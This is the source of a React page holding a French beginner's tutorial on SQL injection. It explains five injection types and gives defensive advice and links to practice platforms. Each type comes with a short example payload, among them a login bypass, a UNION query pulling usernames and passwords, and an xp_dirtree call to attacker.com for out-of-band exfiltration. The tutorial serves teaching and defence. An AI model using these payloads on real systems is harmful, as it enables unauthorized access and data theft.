'use client';

import Quiz from "../component/Quiz";

function DebutantPage() {
  return (
    <>
     <div className="flex flex-col lg:flex-row max-w-7xl mx-auto p-6">
      {/* Sidebar à gauche */}
      <aside className="w-full lg:w-64 mb-8 lg:mb-0 border-r lg:pr-6 text-sm">
        <h2 className="text-lg font-semibold mb-4">Chapitres</h2>
        <ul className="space-y-2">
          <li><a href="#intro" className="hover:underline">1. Introduction</a></li>
          <li>
            <a href="#types" className="hover:underline">2. Types d'injection</a>
            <ul className="ml-4 mt-1 space-y-1 text-gray-400">
              <li><a href="#inband" className="hover:underline">- In-band</a></li>
              <li><a href="#blind" className="hover:underline">- Blind</a></li>
              <li><a href="#time" className="hover:underline">- Time-based</a></li>
              <li><a href="#union" className="hover:underline">- Union-based</a></li>
              <li><a href="#oob" className="hover:underline">- Out-of-band</a></li>
            </ul>
          </li>
          <li><a href="#protection" className="hover:underline">3. Protection</a></li>
        </ul>
      </aside>

      {/* Contenu principal à droite */}
      <div className="flex-1 lg:pl-12">
        <h1 className="text-3xl font-bold mb-4">Injection SQL</h1>

        <h2 id="intro" className="text-2xl font-semibold mb-2">Introduction</h2>
        <p className="mb-6">
          L’injection SQL (SQLi) est l’une des failles de sécurité web les plus connues et les plus dangereuses.
          Elle permet à un attaquant de manipuler des requêtes SQL via des champs mal sécurisés, comme un formulaire de connexion.
          Cela peut permettre de contourner une authentification, voler des données ou même supprimer des tables.
        </p>

        <h2 id="types" className="text-2xl font-semibold mb-4">Les différents types d'injection SQL</h2>

        <h3 id="inband" className="text-xl font-bold mt-6 mb-2">1. 🔓 Injection SQL classique (In-band)</h3>
        <p>
          L'attaquant insère du code SQL dans un champ ou une URL, et voit directement le résultat dans la réponse.
        </p>
        <div className="mockup-code w-full bg-base-200 mt-4 mb-2">
          <pre data-prefix=">"><code>' OR 1=1 --</code></pre>
        </div>
        <p className="mb-6">
          Cela permet de bypasser un login sans mot de passe, ou d'afficher des données sensibles.
        </p>

        <h3 id="blind" className="text-xl font-bold mt-6 mb-2">2. 🙈 Blind SQL Injection (SQLi aveugle)</h3>
        <p>
          La requête est exécutée mais l’attaquant ne voit pas directement le résultat.
          Il observe le comportement (redirection, erreurs, etc.) pour deviner des informations.
        </p>
        <div className="mockup-code w-full bg-base-200 mt-4 mb-2">
          <pre data-prefix=">"><code>' AND (SELECT COUNT(*) FROM users) > 0 --</code></pre>
        </div>

        <h3 id="time" className="text-xl font-bold mt-6 mb-2">3. ⏱️ Time-Based Blind SQL Injection</h3>
        <p>
          Une sous-catégorie de SQLi aveugle. On injecte un délai (ex : `SLEEP(5)`) et on mesure le temps de réponse du serveur.
        </p>
        <div className="mockup-code w-full bg-base-200 mt-4 mb-2">
          <pre data-prefix=">"><code>' OR IF(1=1, SLEEP(5), 0) --</code></pre>
        </div>

        <h3 id="union" className="text-xl font-bold mt-6 mb-2">4. 🔗 Union-Based SQL Injection</h3>
        <p>
          L’attaquant utilise `UNION SELECT` pour combiner sa requête à celle de l’application et faire afficher des données.
        </p>
        <div className="mockup-code w-full bg-base-200 mt-4 mb-2">
          <pre data-prefix=">"><code>' UNION SELECT username, password FROM users --</code></pre>
        </div>

        <h3 id="oob" className="text-xl font-bold mt-6 mb-2">5. 📬 Out-of-Band SQL Injection</h3>
        <p>
          Utilise un canal externe (comme une requête DNS ou HTTP) pour exfiltrer des données. Rare, mais très puissant.
        </p>
        <div className="mockup-code w-full bg-base-200 mt-4 mb-2">
          <pre data-prefix=">"><code>'; EXEC xp_dirtree '\\attacker.com\share' --</code></pre>
        </div>

        <h2 id="protection" className="text-2xl font-semibold mt-10 mb-2">🛡️ Comment s’en protéger ?</h2>
        <ul className="list-disc ml-6 space-y-2 mb-8">
          <li>✅ Utiliser des requêtes préparées (paramétrées)</li>
          <li>✅ Toujours valider les entrées utilisateur</li>
          <li>✅ Ne jamais afficher d'erreurs SQL en production</li>
          <li>✅ Limiter les droits du compte utilisé pour accéder à la base</li>
        </ul>

        <h2 className="text-xl font-bold mb-2">🔗 Pour s’entraîner</h2>
        <ul className="list-disc ml-6 space-y-2">
          <li><a href="https://tryhackme.com/room/sqlinjection" className="text-blue-500 hover:underline" target="_blank">TryHackMe — SQL Injection</a></li>
          <li><a href="https://www.root-me.org/" className="text-blue-500 hover:underline" target="_blank">Root-Me — Web > SQL</a></li>
          <li><a href="https://github.com/digininja/DVWA" className="text-blue-500 hover:underline" target="_blank">DVWA (Damn Vulnerable Web App)</a></li>
        </ul>
        <Quiz/>
      </div>
      
    </div>
    
    </>
  );
}



export default DebutantPage;